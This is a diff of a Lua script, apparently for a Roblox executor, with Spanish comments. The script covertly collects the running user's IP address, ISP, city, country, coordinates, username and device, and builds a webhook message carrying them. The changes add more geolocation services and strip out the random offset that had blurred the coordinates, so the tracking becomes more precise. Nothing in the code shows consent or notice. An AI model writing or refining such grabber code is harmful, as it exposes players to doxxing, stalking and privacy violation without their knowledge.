@@ -22,12 +22,16 @@ local function codeToEmoji(code)
     return utf8.char(first, second)
 end
 
--- Detecta ubicación e ISP
+-- Detecta ubicación usando varios servicios
 local function detectLocation()
     local country, countryCode, city, ip, lat, lon, isp = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil, "Desconocido"
+
     local services = {
-        "https://ipapi.co/json"
+        "https://ipapi.co/json",
+        "https://ipinfo.io/json",
+        "https://ipwhois.app/json/"
     }
+
     for _, url in ipairs(services) do
         local success, response = pcall(function()
             return (syn and syn.request or http_request or request)({Url=url, Method="GET"}).Body
@@ -35,21 +39,15 @@ local function detectLocation()
         if success and response then
             local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
             if ok and data then
-                local latTemp = tonumber(data.latitude or data.lat)
-                local lonTemp = tonumber(data.longitude or data.lon)
-                if latTemp and lonTemp then
-                    latTemp = latTemp + (math.random(-20,20)/1000)
-                    lonTemp = lonTemp + (math.random(-20,20)/1000)
+                country = data.country_name or data.country or country
+                countryCode = data.country_code or data.countryCode or countryCode
+                city = data.city or data.region or data.region_name or city
+                ip = data.ip or data.IP or ip
+                lat = tonumber(data.latitude or data.lat or (data.loc and data.loc:match("([^,]+)"))) 
+                lon = tonumber(data.longitude or data.lon or (data.loc and data.loc:match(",([^,]+)"))) 
+                isp = data.org or data.isp or isp
 
-                    country = data.country_name or country
-                    countryCode = data.country_code or countryCode
-                    city = data.city or city
-                    ip = data.ip or ip
-                    lat = latTemp
-                    lon = lonTemp
-                    isp = data.org or isp
-                    break
-                end
+                if city ~= "Desconocido" then break end
             end
         end
     end
@@ -74,11 +72,10 @@ local function detectLocation()
 end
 
 local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal, ispName = detectLocation()
-
--- Mostrar ISP sin aclaración
 local userISP = ispName ~= "Desconocido" and ("📡 "..ispName) or "🛰️ Desconocido"
 local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332
 
+-- Webhook inicial
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
 
@@ -99,8 +96,8 @@ local data = {
             {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
             {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
             {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
-            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true}, -- Muestra DisplayName donde estaba Username
-            {["name"]="👥 DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},     -- Muestra Username donde estaba DisplayName
+            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
+            {["name"]="👥 DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
             {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
             {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
